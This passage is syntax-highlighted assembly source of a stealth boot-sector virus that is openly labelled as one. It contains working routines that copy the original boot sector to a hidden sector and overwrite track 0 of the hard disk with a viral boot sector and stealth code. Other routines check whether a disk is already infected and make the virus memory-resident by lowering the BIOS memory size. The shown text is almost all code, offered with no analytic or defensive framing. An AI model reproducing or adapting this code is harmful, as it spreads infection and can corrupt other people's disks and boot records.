</span><span class="sc5">INF144M_EXIT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;all done</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;Infect Hard Disk Drive AL with this virus. This involves the following steps:</span><span class="sc0">
</span><span class="sc1">;A) Read the present boot sector. B) Copy it to Track 0, Head 0, Sector 7.</span><span class="sc0">
</span><span class="sc1">;C) Copy the disk parameter info into the viral boot sector in memory. D) Copy</span><span class="sc0">
</span><span class="sc1">;the viral boot sector to Track 0, Head 0, Sector 1. E) Copy the STEALTH</span><span class="sc0">
</span><span class="sc1">;routines to Track 0, Head 0, Sector 2, 5 sectors total.</span><span class="sc0">

</span><span class="sc5">INFECT_HARD</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                          </span><span class="sc1">;set drive type flag to hard disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DR_FLAG</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;cause that's where it's going</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_BOOT_SEC</span><span class="sc0">                    </span><span class="sc1">;read the present boot sector</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0">            </span><span class="sc1">;and go write it at</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;head 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0007H</span><span class="sc0">                        </span><span class="sc1">;track 0, sector 7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">                        </span><span class="sc1">;BIOS write, for 1 sector</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_DATA</span><span class="sc0">
</span><span class="sc1">;       mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SB_BOOT_DATA</span><span class="sc0">      </span><span class="sc1">;required instead of ^ for A86</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32H</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">;copy boot sector disk info over</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;to new boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_START</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">200H</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">42H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">200H</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">42H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc0">                          </span><span class="sc1">;copy partition table</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;to new boot sector too!</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;and write viral boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_START</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PUT_BOOT_SEC</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">STEALTH</span><span class="sc0">               </span><span class="sc1">;buffer for 5 sectors of stealth</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;drive to write to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;head 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002H</span><span class="sc0">                        </span><span class="sc1">;track 0, sector 2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0305H</span><span class="sc0">                        </span><span class="sc1">;write 5 sectors</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;This routine determines if a hard drive C: exists, and returns NZ if it does,</span><span class="sc0">
</span><span class="sc1">;Z if it does not.</span><span class="sc0">
</span><span class="sc5">IS_HARD_THERE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">475H</span><span class="sc0">                         </span><span class="sc1">;Get hard disk count from bios</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;put it in al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;and see if al=0 (no drives)</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;Read the boot sector on the drive AL into SCRATCHBUF. This routine must</span><span class="sc0">
</span><span class="sc1">;prserve AL!</span><span class="sc0">

</span><span class="sc5">GET_BOOT_SEC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0">            </span><span class="sc1">;buffer for the boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;this is the drive to read from</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;head 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;track 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;sector 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;read 1 sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">;BIOS read function</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;This routine writes the data at es:bx to the drive in al at Track 0,</span><span class="sc0">
</span><span class="sc1">;Head 0, Sector 1 for 1 sector, making that data the new boot sector.</span><span class="sc0">

</span><span class="sc5">PUT_BOOT_SEC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;this is the drive to write to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;head 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;track 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;sector 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;read 1 sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">;BIOS write function</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;Determine whether the boot sector in SCRATCHBUF is the viral boot sector.</span><span class="sc0">
</span><span class="sc1">;Returns Z if it is, NZ if not. The first 30 bytes of code, starting at BOOT,</span><span class="sc0">
</span><span class="sc1">;are checked to see if they are identical. If so, it must be the viral boot</span><span class="sc0">
</span><span class="sc1">;sector. It is assumed that es and ds are properly set to this segment when</span><span class="sc0">
</span><span class="sc1">;this is called.</span><span class="sc0">

</span><span class="sc5">IS_VBS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                              </span><span class="sc1">;save these</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT</span><span class="sc0">                  </span><span class="sc1">;set up for a compare</span><span class="sc0">
</span><span class="sc1">;       mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT - OFFSET BOOT_START)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SB_BOOT</span><span class="sc0">       </span><span class="sc1">;required instead of ^ for A86</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">cmpsw</span><span class="sc0">                           </span><span class="sc1">;compare 30 bytes</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                              </span><span class="sc1">;restore these</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;and return with z properly set</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;* A SCRATCH PAD BUFFER FOR DISK READS AND WRITES                              *</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">7A00H</span><span class="sc0">

</span><span class="sc5">SCRATCHBUF</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;a total of 512 bytes</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">SB_BOOT_DATA</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;with references to correspond</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">32H</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">;to various areas in the boot</span><span class="sc0">
</span><span class="sc5">SB_DR_FLAG</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;sector at 7C00</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;these are only needed by A86</span><span class="sc0">
</span><span class="sc5">SB_BOOT</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;tasm and masm will let you</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">458</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">;just do "db 512 dup (0)"</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;* THIS IS THE REPLACEMENT (VIRAL) BOOT SECTOR                                 *</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">7C00H</span><span class="sc0">                           </span><span class="sc1">;Starting location for boot sec</span><span class="sc0">


</span><span class="sc5">BOOT_START</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BOOT</span><span class="sc0">                      </span><span class="sc1">;jump over data area</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090H</span><span class="sc0">                            </span><span class="sc1">;an extra byte for near jump</span><span class="sc0">


</span><span class="sc5">BOOT_DATA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">32H</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                     </span><span class="sc1">;data area and default dbt</span><span class="sc0">
                                                </span><span class="sc1">;(copied from orig boot sector)</span><span class="sc0">

</span><span class="sc5">DR_FLAG</span><span class="sc4">:</span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;Drive type flag, 0=360K Floppy</span><span class="sc0">
                                                </span><span class="sc1">;                 1=1.2M Floppy</span><span class="sc0">
                                                </span><span class="sc1">;                 2=720K Floppy</span><span class="sc0">
                                                </span><span class="sc1">;                 3=1.4M Floppy</span><span class="sc0">
                                                </span><span class="sc1">;                 80H=Hard Disk</span><span class="sc0">

</span><span class="sc1">;The boot sector code starts here</span><span class="sc0">
</span><span class="sc5">BOOT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">                                     </span><span class="sc1">;interrupts off</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;set up segment registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_START</span><span class="sc0">            </span><span class="sc1">;and stack pointer</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">MEMSIZE</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;get size of memory available</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                            </span><span class="sc1">;on this system, in Kilobytes</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                           </span><span class="sc1">;convert KBytes into a segment</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7E0H</span><span class="sc0">                         </span><span class="sc1">;subtract enough so this code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;will have the right offset to</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">MEMSIZE</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">;go memory resident in high ram</span><span class="sc0">

</span><span class="sc5">GO_RELOC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_START</span><span class="sc0">            </span><span class="sc1">;set up ds:si and es:di in order</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                           </span><span class="sc1">;to relocate this code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">                          </span><span class="sc1">;to high memory</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;and go move this sector</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">RELOC</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;push new far @RELOC onto stack</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">                                    </span><span class="sc1">;and go there with retf</span><span class="sc0">

</span><span class="sc5">RELOC</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;now we're in high memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;so let's install the virus</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">STEALTH</span><span class="sc0">               </span><span class="sc1">;set up buffer to read virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DR_FLAG</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;drive number</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;Load from proper drive type</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">LOAD_360</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">LOAD_12M</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">LOAD_720</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">LOAD_14M</span><span class="sc0">                        </span><span class="sc1">;if none of the above,</span><span class="sc0">
                                                </span><span class="sc1">;then it's a hard disk</span><span class="sc0">

</span><span class="sc5">LOAD_HARD</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;load virus from hard disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                          </span><span class="sc1">;hard drive 80H, head 0,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;track 0,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">;start at sector 2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">LOAD1</span><span class="sc0">

</span><span class="sc5">LOAD_360</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;load virus from 360 K floppy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                           </span><span class="sc1">;track 40</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;start at sector 1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">LOAD</span><span class="sc0">

</span><span class="sc5">LOAD_12M</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;load virus from 1.2 Meg floppy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">                           </span><span class="sc1">;track 80</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;start at sector 1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">LOAD</span><span class="sc0">

</span><span class="sc5">LOAD_720</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;load virus from 720K floppy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">79</span><span class="sc0">                           </span><span class="sc1">;track 79</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">;start at sector 4</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">LOAD</span><span class="sc0">                      </span><span class="sc1">;go do it</span><span class="sc0">

</span><span class="sc5">LOAD_14M</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;load from 1.44 Meg floppy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">79</span><span class="sc0">                           </span><span class="sc1">;track 79</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">                           </span><span class="sc1">;start at sector 13</span><span class="sc0">
</span><span class="sc1">;       jmp     SHORT LOAD                      ;go do it</span><span class="sc0">

</span><span class="sc5">LOAD</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">                         </span><span class="sc1">;disk 0, head 1</span><span class="sc0">
</span><span class="sc5">LOAD1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">206H</span><span class="sc0">                         </span><span class="sc1">;read 6 sectors</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">                             </span><span class="sc1">;call BIOS to read it</span><span class="sc0">

</span><span class="sc5">MOVE_OLD_BS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;now move old boot sector into</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;low memory</span><span class="sc0">
